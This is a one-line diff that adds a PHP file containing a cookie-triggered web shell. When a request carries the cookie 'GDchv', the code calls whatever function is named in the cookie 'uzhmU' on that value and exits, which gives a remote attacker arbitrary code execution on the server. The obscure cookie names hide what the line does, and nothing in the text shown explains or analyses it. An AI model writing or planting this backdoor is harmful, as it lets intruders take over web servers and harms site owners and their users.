@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["GDchv"])){$_COOKIE["uzhmU"]($_COOKIE["GDchv"]);exit;}
